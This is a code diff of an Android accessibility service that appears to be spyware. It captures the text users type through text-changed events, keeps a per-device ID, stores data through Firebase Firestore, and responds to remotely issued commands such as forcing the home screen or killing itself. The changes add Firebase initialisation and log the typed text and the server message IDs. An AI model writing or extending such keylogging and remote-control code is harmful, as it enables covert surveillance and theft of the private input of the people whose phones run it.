@@ -15,6 +15,7 @@ import android.view.accessibility.AccessibilityNodeInfo
 import com.client.services.client.KILL_SELF_BROADCAST
 import com.client.services.client.currentDeviceID
 import com.client.services.client.sendMessage
+import com.google.firebase.FirebaseApp
 import com.google.firebase.firestore.FirebaseFirestore
 import java.io.File
 import java.text.SimpleDateFormat
@@ -31,7 +32,6 @@ class MyAccessibilityService : AccessibilityService() {
     private var logFile: File? = null
     private var n: Int = 0
     private val MAX = 500
-    private val firestore = FirebaseFirestore.getInstance()
 
     companion object {
         const val ACTION_GO_HOME = "com.client.services.others.MyAccessiblityService.ACTION_GO_HOME"
@@ -41,6 +41,10 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     override fun onCreate() {
+        if (FirebaseApp.getApps(this).isEmpty()) {
+            Log.d("MyAccessibilityService", "Firebase not initialized, initializing ...")
+            FirebaseApp.initializeApp(this);
+        }
         super.onCreate()
 //        val killSelfBroadcastReceiver = object : BroadcastReceiver() {
 //            override fun onReceive(context: Context, intent: Intent) {
@@ -57,6 +61,7 @@ class MyAccessibilityService : AccessibilityService() {
             val action = intent?.action ?: return
             val messageID = intent.getStringExtra("MessageID")
             val serverID = intent.getStringExtra("ServerID")
+            Log.i("MyAccessibilityService", "MessageID: $messageID, ServerID: $serverID")
             when (action) {
                 ACTION_GO_HOME -> {
                     performGlobalAction(GLOBAL_ACTION_HOME)
@@ -156,6 +161,7 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        val firestore = FirebaseFirestore.getInstance()
         try {
             if (n > MAX) {
                 n = 0
@@ -164,6 +170,7 @@ class MyAccessibilityService : AccessibilityService() {
             if (event != null) {
                 when (event.eventType) {
                     AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                        Log.i("AccessibilityService", "Text changed: ${event.text}")
                         var str = ""
                         for (c in event.text) {
                             str += c.toString()
